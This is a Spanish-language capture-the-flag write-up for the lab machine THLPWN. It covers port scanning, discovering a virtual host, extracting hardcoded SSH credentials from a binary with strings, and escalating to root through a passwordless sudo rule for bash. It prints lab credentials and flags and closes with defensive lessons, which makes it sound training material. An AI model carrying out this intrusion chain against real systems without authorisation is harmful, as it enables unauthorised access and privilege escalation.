# 🎯 THLPWN – The Hackers Labs

| Campo          | Detalle            |
|----------------|--------------------|
| **Plataforma** | The Hackers Labs   |
| **Dificultad** | Principiante       |
| **SO**         | Linux (Debian)     |
| **Fecha**      | 08/04/2026         |
| **Estado**     | Completada ✅      |

---

## 🗺️ Cadena de ataque

```
Reconocimiento → Information Disclosure (HTML + Binario) → SSH → Sudo Misconfiguration → Root
```

---

## 🔍 1. Reconocimiento

### Escaneo de puertos (Nmap)

```bash
nmap -p- --open -sCV -sS -Pn -n --min-rate 5000 192.168.0.17 -oN escaneo
```

**Puertos detectados:**

| Puerto   | Servicio | Versión                        |
|----------|----------|--------------------------------|
| 22/tcp   | SSH      | OpenSSH 9.2p1 (Debian)        |
| 80/tcp   | HTTP     | nginx 1.22.1                   |

**Análisis:** El puerto 80 devuelve `403 Forbidden` al acceder por IP directa, lo que indica el uso de Virtual Hosting.

---

### Descubrimiento del Virtual Host

Al acceder por IP, el servidor bloquea la conexión. Inspeccionamos el código fuente de la página de error:

```bash
curl http://192.168.0.17
```

**Hallazgo:** El dominio estaba oculto en un comentario HTML dentro del CSS:

```html
<!--thlpwn.thl-->
```

Este es un ejemplo de **Information Disclosure** — información sensible expuesta involuntariamente en el código fuente público.

Configuramos el host local para resolver el dominio:

```bash
echo "192.168.0.17 thlpwn.thl" | sudo tee -a /etc/hosts
```

---

### Enumeración web

Accedemos al sitio con el dominio correcto y encontramos una página con varios directorios enlazados públicamente:

```
/admin/     /api/     /downloads/     /backups/     /uploads/
```

Intentamos fuzzing con Gobuster, pero el servidor devuelve código 200 para rutas inexistentes (wildcard response). Filtramos por tamaño:

```bash
gobuster dir -u http://thlpwn.thl -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,bak --exclude-length 4478
```

Dado que los directorios relevantes ya estaban expuestos en el HTML, optamos por exploración directa.

---

## 🚀 2. Explotación

### Análisis del binario

En `/downloads/` encontramos un binario ELF llamado `auth_checker`. Lo descargamos y analizamos:

```bash
wget http://thlpwn.thl/downloads/auth_checker
file auth_checker
strings auth_checker
```

**`file` nos reveló:**
```
ELF 64-bit LSB executable, x86-64, dynamically linked
```

**`strings` extrajo credenciales hardcodeadas:**

```
Username: thluser
Password: 9Kx7mP2wQ5nL8vT4bR6zY
```

El desarrollador cometió el error de almacenar credenciales SSH en texto plano dentro del binario. Aunque el binario no es legible directamente, la herramienta `strings` extrae todos los fragmentos de texto legible incrustados en él.

---

### Acceso inicial (SSH)

Con las credenciales obtenidas:

```bash
ssh thluser@192.168.0.17
```

**Credenciales:** `thluser` / `9Kx7mP2wQ5nL8vT4bR6zY`

🚩 **User Flag:**
```bash
cat ~/flag.txt
# THL{3x7K9mL2pQ8vW5nR4zT6yH}
```

**Nota:** El archivo `.bash_history` estaba redirigido a `/dev/null` — técnica anti-forense para evitar que queden registros de comandos ejecutados.

---

## 👑 3. Escalada de Privilegios

### Enumeración de permisos sudo

```bash
sudo -l
```

**Hallazgo:**
```
(ALL) NOPASSWD: /bin/bash
```

El usuario `thluser` puede ejecutar `/bin/bash` como root sin contraseña — una configuración gravemente insegura que otorga acceso total al sistema.

### Explotación

```bash
sudo /bin/bash
```

🚩 **Root Flag:**
```bash
cat /root/root.txt
# THL{9sT2mK7xQ5pL3wV8nZ6bR4}
```

---

## 📊 4. Resumen

| Fase              | Acción                              | Herramienta       | Resultado                          |
|-------------------|-------------------------------------|-------------------|------------------------------------|
| Reconocimiento    | Escaneo de puertos                  | Nmap              | SSH (22) y HTTP (80)               |
| Enumeración       | Lectura de código fuente HTML       | curl              | Dominio `thlpwn.thl` descubierto   |
| Enumeración       | Fuzzing de directorios              | Gobuster          | Wildcard response detectada        |
| Explotación       | Análisis de binario ELF             | strings           | Credenciales SSH hardcodeadas      |
| Acceso inicial    | Conexión SSH                        | ssh               | Acceso como `thluser`              |
| Escalada          | Abuso de sudo misconfiguration      | sudo              | Shell como root                    |

---

## 🧠 5. Lecciones aprendidas

- **Information Disclosure en HTML:** Los comentarios en el código fuente son visibles para cualquier atacante. Nunca incluir información sensible en comentarios HTML.
- **Credenciales hardcodeadas en binarios:** Aunque un binario no es legible directamente, herramientas como `strings` extraen texto plano en segundos. Las credenciales nunca deben estar en el código.
- **Wildcard responses:** Cuando un servidor devuelve 200 para rutas inexistentes, el fuzzing estándar no funciona — hay que filtrar por tamaño de respuesta con `--exclude-length`.
- **Sudo misconfiguration:** Permitir ejecutar `/bin/bash` sin contraseña es equivalente a dar acceso root completo a cualquiera que comprometa la cuenta.
- **Virtual Host Discovery:** Un 403 por IP no significa que no haya contenido — puede indicar Virtual Hosting. Leer el código fuente de las páginas de error puede revelar el dominio correcto.
